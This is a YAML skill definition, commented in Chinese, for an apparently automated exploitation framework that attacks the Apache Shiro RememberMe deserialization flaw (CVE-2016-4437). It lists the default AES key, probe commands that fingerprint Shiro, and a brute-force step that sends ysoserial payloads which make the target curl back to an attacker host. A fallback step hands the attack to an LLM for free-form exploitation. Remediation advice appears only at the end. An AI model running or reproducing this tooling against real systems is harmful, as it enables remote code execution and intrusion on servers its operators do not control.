# ═══════════════════════════════════════════════════════════
# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437) v4
#
# 原理: Shiro 用 AES 密钥加密 RememberMe Cookie 中的序列化对象
#       攻击者用已知密钥 + ysoserial gadget 构造恶意 Cookie → RCE
#
# v4 改进:
#   - 回调检测替代 deleteMe 判断（deleteMe 机制不可靠）
#   - shiro_exploit.py v2 内置回调爆破
#   - Python AES 替代 Java 编译加密
#   - JDK 8 只用于 ysoserial payload 生成
# ═══════════════════════════════════════════════════════════
skill_id: shiro_rce
name: "Apache Shiro RememberMe 反序列化 RCE"
category: java_deserialization
version: "4.0"

principle: |
  Apache Shiro 的 RememberMe 功能使用 AES 加密序列化的用户身份信息。

  漏洞根因：
  - Shiro 1.2.4 及更早版本使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA==
  - 大量项目使用了其他已知/泄露的密钥

  检测难点（为什么不用 deleteMe 判断）：
  - 密钥错误 → 解密失败 → 返回 deleteMe
  - 密钥正确但 gadget 异常 → 反序列化抛异常 → 也返回 deleteMe
  - CB1 gadget 执行命令是副作用，异常后 Shiro 仍设 deleteMe
  - 所以 deleteMe 不能区分"密钥错误"和"密钥正确但 gadget 异常"

  正确方法：网络回调检测
  - 用 ysoserial 生成 "curl http://LHOST:PORT/shiro" payload
  - AES 加密后发送，目标执行 curl 回连
  - 监听器收到回调 = RCE 确认

  关键约束：ysoserial 必须用 JDK 8 运行。

match:
  rules:
    - fingerprint_contains: ["shiro"]
    - fingerprint_contains: ["rememberMe", "deleteMe"]
    - evidence_contains: ["rememberMe=deleteMe"]
    - evidence_contains: ["shiro"]
    - cve_matches: ["CVE-2016-4437"]
    - cve_matches: ["CVE-2020-1957"]

probes:
  - id: confirm_shiro
    description: "确认 Shiro 框架存在"
    command: |
      echo "=== Shiro 探测 ==="
      response=$(curl -s -D - -o /dev/null {ENDPOINT} \
        -H "Cookie: rememberMe=invalid_base64_token_test" \
        --max-time 10 2>&1)
      echo "$response"
      if echo "$response" | grep -qi "rememberMe=deleteMe"; then
        echo "SHIRO_CONFIRMED=true"
      fi
    timeout: 15
    parse_rules:
      - if_contains: ["SHIRO_CONFIRMED=true"]
        set: { shiro_confirmed: true }

  - id: check_java8
    description: "检查 toolbox 中 JDK 8 是否可用"
    depends_on: { shiro_confirmed: true }
    command: |
      FOUND=""
      for p in \
        /usr/lib/jvm/java-8/bin/java \
        /usr/lib/jvm/java-8-openjdk-amd64/bin/java \
        /usr/lib/jvm/temurin-8/bin/java \
      ; do
        if [ -x "$p" ]; then
          ver=$($p -version 2>&1 | head -1)
          echo "JAVA8_PATH:$p"
          echo "JAVA8_VER:$ver"
          FOUND="yes"
          break
        fi
      done
      [ -z "$FOUND" ] && echo "JAVA8_MISSING"
    timeout: 10
    parse_rules:
      - if_regex: "JAVA8_PATH:(.+)"
        set: { java8_available: true }
      - if_contains: ["JAVA8_MISSING"]
        set: { java8_available: false }

exploit_paths:
  # ═══ 路径 A: shiro_exploit.py v2 回调检测 ═══
  - path_id: shiro_callback
    name: "shiro_exploit.py 回调检测"
    priority: 1
    principle: |
      使用 shiro_exploit.py 自动完成:
      1. 用 JDK 8 + ysoserial 预生成各 gadget 的回调 payload
      2. 启动 HTTP 回调监听器
      3. 遍历 密钥×gadget 组合，发送加密 Cookie
      4. 收到回调即确认 RCE

      需要 LHOST 环境变量（攻击机公网 IP）和端口映射。
    conditions:
      shiro_confirmed: true
    steps:
      - id: shiro_exploit
        description: "回调检测爆破（密钥×gadget 自动遍历）"
        publish_ports: [39876]
        command: |
          python3 /opt/shiro_exploit.py {ENDPOINT} \
            --lhost "$LHOST" --port 39876
        timeout: 420
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_callback"

  # ═══ 路径 B: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理（限定 Shiro 漏洞范围）"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      shiro_confirmed: true

remediation: |
  1. 升级 Shiro 至 1.6.0+ 并配置强随机 AES 密钥
  2. 不要使用默认密钥 kPH+bIxk5D2deZiIxcaaaA==
  3. 升级 commons-beanutils、commons-collections 等反序列化依赖
  4. 考虑禁用 rememberMe 功能或缩短有效期
  5. 配置 WAF 拦截超长 Cookie 值